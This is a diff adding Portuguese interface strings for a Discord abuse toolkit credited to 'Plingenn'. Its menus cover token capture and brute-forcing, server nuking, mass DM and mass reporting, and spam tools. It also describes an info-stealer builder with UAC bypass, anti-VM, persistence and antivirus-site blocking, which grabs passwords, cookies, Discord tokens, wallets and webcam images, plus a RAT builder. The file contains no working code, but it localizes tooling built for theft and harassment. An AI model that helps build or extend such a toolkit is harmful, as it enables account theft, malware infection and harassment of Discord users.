@@ -1,0 +1,396 @@
+Informações do Token{end_space5}
+Login do Token{end_space12}
+Destruidor de Token{end_space6}
+Capturador de Token{end_space6}
+Desabilitador de Token{end_space3}
+Força Bruta de Token{end_space5}
+Digitador Falso{end_space10}
+Atirador de Vaidade{end_space6}
+Spammer de Grupo{end_space9}
+Bloqueador de Amigos{end_space5}
+Remover Amigos{end_space16}
+Removedor de Pedidos{end_space5}
+Criar Novos Servidores{end_space3}
+Alterador de Perfil{end_space6}
+Capturador de Código QR{end_space2}
+Bot Rato Discord{end_space9}
+Pressionador de Botões{end_space3}
+Reagir a Mensagens{end_space7}
+DM em Massa{end_space14}
+Denunciar em Massa{end_space7}
+Adicionar Amigos em Massa
+Apagar DM{end_space16}
+Limpar DM{end_space16}
+Burlar Regras{end_space12}
+Burlar Restaurar Discord{end_space1}
+Burlar Martelo de Forja{end_space2}
+Ferramenta de Webhook{end_space4}
+Feito por Plingenn{end_space7}
+Registro de Alterações{end_space3}
+Configurações{end_space12}
+Chat
+Gerenciar Tokens
+Próx Página
+Executando em:{end_space12}
+Escolha inválida, por favor, tente novamente!
+Interrompido pelo usuário.
+Alterador de Tema
+Configurações da Conta
+Configurações de Proxy
+Configurações de Aparência
+Alternar Modo de Depuração
+Painel de Administração
+Configuração Inválida
+CIANO
+AZUL
+VERDE
+VERMELHO
+BRANCO
+AMARELO
+MAGENTA
+VERMELHO CLARO
+AZUL CLARO
+VERDE CLARO
+CIANO CLARO
+PRETO CLARO
+Tema definido para
+Visão Geral da Conta
+Minha Licença
+Histórico de Compras
+Resgatar Código
+Baixar Software
+Nome de Usuário
+Criado em
+Alterar Nome de Usuário
+Sair
+Falha na alteração do nome de usuário, O nome de usuário deve conter pelo menos 3 caracteres.
+Deseja sair da sua Conta? (S/N)
+Produto
+Expira em
+Data
+Digite seu código de produto para obter seu conteúdo.
+Código
+Você já resgatou o código.
+Certifique-se de salvar seu produto antes de pressionar Enter!
+Chave não encontrada na resposta
+Falha ao recuperar dados para o código fornecido
+URL não encontrada nas informações do código
+Código Inválido!
+Alternar Uso de Proxy
+Limpar Cache de Proxy
+Adicionar Próprios Proxies ao Cache
+Raspar Proxy
+Escolha Inválida
+Modo de Depuração Alternado {RED}DESATIVADO
+Modo de Depuração Alternado {GREEN}ATIVADO
+Adicionado novo Sistema de Autenticação
+Sistema de Configuração Melhorado
+Interface de Painel Remodelada
+Adicionado sistema de Chat
+Adicionadas novas configurações de conta
+Implementado cache para melhor desempenho
+RPC Personalizado do Discord
+Alternar RPC do Discord
+Alternar RPC Personalizado do Discord
+Editar RPC Personalizado do Discord
+RPC Personalizado do Discord Desativado
+RPC Personalizado do Discord Ativado
+Detalhes (Obrigatório)
+Os detalhes devem ter pelo menos 3 caracteres.
+Estado (Obrigatório)
+O estado deve ter pelo menos 3 caracteres.
+URL da imagem grande (Opcional)
+Texto grande (Opcional)
+URL da imagem pequena (Opcional)
+Texto pequeno (Opcional)
+Quantos botões você deseja ter?
+Digite o rótulo para o botão
+Digite a URL para o botão
+Formato de URL inválido. Por favor, insira uma URL válida.
+Número inválido de botões. Por favor, insira um número entre 0 e 2.
+RPC do Discord Desativado
+RPC do Discord Ativado
+Modo Normal
+Modo RestoreCord (burlar captcha)
+Verificador de Cache
+Verificador Personalizado
+Verificador de Servidor
+Digite o caminho personalizado para carregar tokens de
+Chat Normal
+Chat de Suporte (Indisponível)
+Chat Privado (Indisponível)
+Busca de Servidor{end_space8}
+Clonador de Servidor{end_space5}
+Destruidor de Servidor{end_space3}
+Unidor de Token{end_space10}
+Separador de Token{end_space7}
+Spammer de Token{end_space9}
+Convulsão{end_space16}
+Spammer de SoundBoard{end_space4}
+Unidor de Voz no Chat{end_space4}
+Alterador de Foto de Perfil{end_space2}
+Apelido Global{end_space11}
+Apelido Servidor{end_space12}
+Alterador de HypeSquad{end_space3}
+Alterador de Pronomes{end_space4}
+Alterador de Idioma{end_space6}
+Alterador de Status{end_space6}
+Alterador de Tema{end_space8}
+Alterador de Biografia{end_space3}
+Gerador de Conta{end_space9}
+Criador de VideoCrash{end_space4}
+Ciclador de Configurações{end_space4}
+Notas de Atualização{end_space5}
+Telegrama{end_space16}
+Selfbot{end_space18}
+Github{end_space19}
+Sobre{end_space20}
+Sair{end_space21}
+Página Anterior
+Nomes de Servidores
+Mensagem
+Contagem de Threads
+Ocorreu um erro:
+Nenhum token foi encontrado no cache
+Implantando Ataque de Chuva
+Ataque de Chuva Implantado. . .
+Mensagens
+ID da Mensagem:
+Enviada uma mensagem para todos os amigos disponíveis.
+Saiu do servidor:
+Excluído o servidor:
+O seguinte erro foi encontrado e está sendo ignorado:
+Excluído/Saiu de todos os servidores disponíveis.
+Removendo amigo:
+Amigo removido:
+Todos os amigos disponíveis foram removidos.
+Criando
+Criado
+Todos os servidores foram criados.
+Ataque de Chuva Detonado com Sucesso!
+Transformado com sucesso em uma Terra de Reme
+Digite qualquer coisa para continuar. . .
+Iniciando modo de convulsão (Alternando entre modo claro/escuro)
+Não há amigos suficientes para prosseguir.
+Ocorreu um erro ao processar o token
+Spammer de Canal
+ID do Canal
+Burla de Regras
+ID do Servidor
+Digitador Falso de Token
+Apelidador Global
+Apelido
+Apelidador de Servidor
+Alterador de Pronomes
+Pronomes Aleatórios (s/n)
+Pronomes
+DM Excluída:
+Não há DMs suficientes para prosseguir.
+Ciclo interrompido
+Spammer de Sound Board
+Programa interrompido pelo usuário.
+Falha ao enviar pulsação com o token:
+Falha ao entrar na VC com o token:
+Entrando na VC com Tokens...
+Convite atualizado com sucesso, seu servidor agora pode ser acessado por
+Falha ao atualizar URL personalizada. Código de status:
+Código de vaidade a ser snipeado
+ID do Servidor para aplicar a vaidade
+Intervalo entre verificações (segundos)
+O Snipeador de Vaidade foi iniciado. Pressione Ctrl+C para parar.
+Erro:
+Spammer de Webhook
+Apagador de Webhook
+Webhook
+Webhook apagado com sucesso
+Gerenciador de Token
+Salvar Tokens
+Limpar Tokens
+Verificar Tokens e Salvar Apenas os Válidos (s/n)
+Cache de Tokens Esvaziado.
+Digite o caminho para o arquivo de texto contendo tokens
+Nenhum token foi encontrado no arquivo de texto especificado
+Verificador de Token
+Falha ao obter o nome do servidor:
+Entrando
+Força Bruta de Token da Chuva. PS: Isso pode demorar muito para funcionar.
+Se você tiver muita sorte e conseguir obter o token de alguém, você o encontrará armazenado em 'brute-force.txt'.
+Sempre peça permissão explícita do indivíduo antes de realizar um ataque de força bruta em sua conta.
+ID de usuário inválido, por favor, tente novamente!
+VÁLIDO
+INVÁLIDO
+Erro ao obter fontes de cobrança:
+Erro ao obter dados do nitro:
+Nenhuma informação de cobrança disponível.
+Coletando informações do usuário e Webdrivers..
+Nome do Arquivo
+Senha do Arquivo
+Deseja fornecer um arquivo de ícone? (S/N)
+Caminho ou URL de ícone inválido. Definindo ícone como Nenhum.
+Me avise (S/N)
+Anti VM (S/N)
+Iniciar na Inicialização (S/N)
+UacBypass (S/N)
+Derreter (S/N)
+Ocultar Console (S/N)
+Capturar Webcam (S/N)
+Capturar Senhas (S/N)
+Capturar Cookies (S/N)
+Capturar Autofills (S/N)
+Capturar Histórico (S/N)
+Capturar Tokens do Discord (S/N)
+Capturar Jogos (S/N)
+Capturar Senhas de Wi-Fi (S/N)
+Capturar Informações do Sistema (S/N)
+Capturar Captura de Tela (S/N)
+Capturar Telegrama (S/N)
+Capturar Arquivos Comuns (S/N)
+Capturar Carteiras (S/N)
+Erro Falso (S/N)
+Título do Erro Falso
+Mensagem de Erro Falso
+Bloquear Sites Antivírus (S/N)
+Injeção no Discord (S/N)
+Ícone do Arquivo
+Criando {name}.exe, Isso levará alguns segundos. Obrigado pela sua paciência!
+O Arquivo está em 'output/grabberbuilder/{name}.exe
+Criado grupo de chat
+Taxa limitada ({response.json()['retry_after']}ms)
+Não há amigos suficientes disponíveis para seleção aleatória
+Você quer escolher os usuários você mesmo para spam de grupo de chat ou quer selecionar aleatórios?
+Escolher usuários você mesmo
+Aleatorizar os usuários
+Criando grupos de chat
+IDs de usuário
+Você não tinha vírgulas (,) o formato é id,id2,id3
+a qualquer momento para parar
+Bloqueado:
+Erro ao obter relacionamentos:
+Não há solicitações de amizade suficientes para prosseguir.
+Solicitação de Amizade Recebida de:
+Solicitação de Amizade Removida de:
+Total de Solicitações de Amizade Removidas:
+Ocorreu um erro ao criar {server_name}: {e}
+ícone para os servidores sim/não
+Nomes de servidores aleatórios
+Nomes de servidores personalizados
+Nome dos servidores que serão criados
+Por favor, insira a localização do ícone
+Não foi possível encontrar "{image}" em seu computador
+Status Personalizado
+Biografia Personalizada
+Criando Arquivo... {i}
+Escrevendo Arquivo... {i}
+Nota: Este código não está em condição de funcionamento completo agora, mas ainda é executável.\nNo entanto, você pode encontrar erros ou bugs.
+Digite o nome que deseja dar ao arquivo final
+Digite o token do bot que você usará para executar os comandos RAT
+Token do Bot
+Digite o ID do servidor no qual os comandos de barra estão registrados
+Erro ao escrever o arquivo: {e}
+O arquivo foi corretamente escrito para "output/{fileName}.py"
+Converter seu script em um executável (S/N)
+Criando arquivo...
+Limpando arquivos antigos...
+O arquivo executável foi corretamente gerado
+Ocorreu um erro HTTP: {e}
+ID da mensagem
+Por favor, selecione o botão que você deseja pressionar
+{r}({LIGHTBLACK_EX}{i}{r}) Nome: {LIGHTBLACK_EX}{button_label}{r} , ID Personalizado: {LIGHTBLACK_EX}{button_custom_id}
+Botão
+Apenas um botão encontrado na mensagem.
+Falha ao adicionar reação {reaction} à mensagem {message_id}. O número máximo de reações já foi alcançado.
+O número máximo de reações já foi alcançado.
+Falha ao adicionar reação {reaction} à mensagem {message_id}. Proibido: {error_message}
+Objetos
+Faces
+Animais
+Símbolos
+Nenhum emoji encontrado na resposta
+Falha ao buscar emojis na API
+Link de convite
+Formato de link de convite inválido.
+Ocorreu um erro ao enviar a solicitação
+Informações de Convite:
+Informações do Convidador:
+Informações do Servidor:
+Canal
+Data de Expiração
+ID do Usuário
+Distintivos
+Indisponível
+Nome
+ID do Servidor
+Descrição
+Banner
+URL do Banner
+URL do Banner (Indisponível)
+URL de Vaidade
+Nível de Verificação
+Splash
+URL do Splash
+URL do Splash (Indisponível)
+Recursos
+Convulsão Iniciada. Pressione Ctrl+C para parar.
+Convulsão interrompida
+Ciclo de idioma iniciado. Pressione Ctrl+C para parar.
+Token inválido.
+Pressione ENTER para continuar
+Ferramenta de API do Discord | https://Rain.xyz | Feito por Plingenn
+Configurações de Aparência
+Configurações de Texto
+Configurações de Cursor
+Configurações de Transparência
+Configurações de Janela
+Configurações de Idioma
+Esquema de Cores
+Tipo de Fonte
+Tamanho da Fonte
+Altura da Linha
+Peso da Fonte
+Efeitos de Terminal Retrô
+Configurações de Cor
+Configurações de Fonte
+Configurações de Tamanho de Fonte
+Configurações de Altura de Linha
+Configurações de Peso da Fonte
+Configurações Retrô
+Configurações de Cursor
+Idioma definido como {chosen_language}
+Sem Nome
+Tipo
+Casa
+Link da Mensagem
+Link de mensagem inválido
+Voltando...
+Falha ao conectar-se ao RPC do Discord: {e}
+Escolha
+Tema
+Configuração
+Editar
+Idioma
+Opacidade do Painel
+Opacidade Inválida
+Configurações de Janela
+Esta opção é um trabalho em andamento
+Esta opção está atualmente indisponível. Por favor, seja paciente, pois será adicionada posteriormente.
+Esta opção está atualmente indisponível.
+Será substituída em uma das próximas atualizações por: '{replacement}'.
+Esta opção não está disponível
+Essas opções estão atualmente em desenvolvimento
+Essas opções estão atualmente em desenvolvimento, mas permanecem utilizáveis. No entanto, é provável que ocorram bugs ou erros.
+Falha ao buscar pronomes de {pronounce_url} ({statuscode})
+O uso de proxy está atualmente indisponível. Pedimos desculpas por qualquer inconveniente. Será acessível em uma de nossas próximas atualizações.
+Uso de Proxy Alternado {RED}DESATIVADO
+Uso de Proxy Alternado {GREEN}ATIVADO
+Novos Proxies Escritos com Sucesso
+Proxies Extraídos com Sucesso
+Feito! Extraídos {proxies} no total => {temp} | {execution_time}ms
+PC{end_space4}
+Suporte multi-idioma implementado.
+Tópico em massa{end_space10}
+Spammer de fórum
+DM em massa para usuários
+N/A{end_space22}
+Impulsionador de servidor{end_space5}
+Usuário online com token{end_space1}
+Criador de enquetes{end_space6}
